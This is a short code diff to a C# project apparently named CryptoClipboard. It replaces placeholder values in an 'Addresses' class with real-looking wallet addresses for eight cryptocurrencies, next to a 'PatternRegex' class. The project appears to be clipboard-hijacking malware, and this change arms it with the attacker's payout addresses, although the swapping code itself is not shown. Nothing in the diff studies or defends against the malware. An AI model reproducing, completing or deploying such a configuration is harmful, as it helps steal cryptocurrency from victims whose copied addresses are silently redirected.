@@ -25,14 +25,14 @@ namespace CryptoClipboard
 
     internal static class Addresses
     {
-        public readonly static string btc = "btc";
-        public readonly static string ethereum = "eth";
-        public readonly static string xmr = "xmr";
-        public readonly static string doge = "doge";
-        public readonly static string lte = "lte";
-        public readonly static string ripple = "rp";
-        public readonly static string dash = "";
-        public readonly static string bch = "bch";
+        public readonly static string btc = "bc1qmsyzncyge2uwhqn47m40sa08xq7qh4yllyfvh3";
+        public readonly static string ethereum = "0xc2a3f46704b3265446359b0f1da42f24b9482eef";
+        public readonly static string xmr = "41nizz95at5QEZ9ZhLi2mUHVHEHhbDSXB4Q3uMNFh5H8H7w9TtRzZ3qQkkMdkf7B3v7TVMCZ63gmqgaSkWtgjnv5L9Ke7cR";
+        public readonly static string doge = "DPAEQ7isk3s7UVX5gRfRpoSue3hCox6HCx";
+        public readonly static string lte = "ltc1qleqf2hnudumwj7w9jwrsk7zvu80fahgss6dyz5";
+        public readonly static string ripple = "rHcFoo6a9qT5NHiVn1THQRhsEGcxtYCV4d";
+        public readonly static string dash = "XbRfVkCnQxkLVQA3HMsnkbPsUrfnuCitMJ";
+        public readonly static string bch = "1HPmtxEBHN3rDjzd1pQWnuyKDiFaDzVDAv";
     }
 
     internal static class PatternRegex
